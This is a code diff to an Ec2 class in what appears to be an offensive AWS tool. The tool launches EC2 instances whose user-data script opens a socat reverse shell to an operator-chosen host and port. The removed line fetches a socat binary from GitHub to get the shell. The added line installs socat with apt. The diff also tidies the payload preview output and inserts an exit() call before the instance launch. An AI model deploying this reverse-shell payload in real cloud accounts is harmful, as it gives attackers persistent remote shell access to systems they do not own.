@@ -8,8 +8,7 @@ class Ec2():
     def __init__(self, session, console):
         self.ec2 = session.client("ec2")
         self.console = console
-        self.user_data_payload = f"sudo apt install wget -y && wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat" \
-        " && chmod a+x /tmp/socat && /tmp/socat tcp:<rhost>:<rport> exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+        self.user_data_payload = f"sudo apt update && sudo apt install socat -y && socat tcp:<rhost>:<rport> exec:/bin/sh,pty,stderr,setsid,sigint,sane"
     
     def _create_key_pair(self, key_name: str):
         def _create(key_name: str, dry=True):
@@ -109,8 +108,10 @@ class Ec2():
         self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
         self.user_data_payload = self.user_data_payload.replace("<rport>", str(rport))
         _tmp_payload = self.user_data_payload.replace(" && ", "\n")
-        self.console.print(f"User data payload preview.. ([yellow]PREVIEW[/yellow])\n\n```\n{_tmp_payload}\n```\n")
-        self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])\n")
+        self.console.print(f"User data payload preview.. ([yellow]PREVIEW[/yellow])")
+        self.console.print("-"*70+f"\n{_tmp_payload}\n"+"-"*70)
+        self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])")
+        exit()
         self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
         self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
 
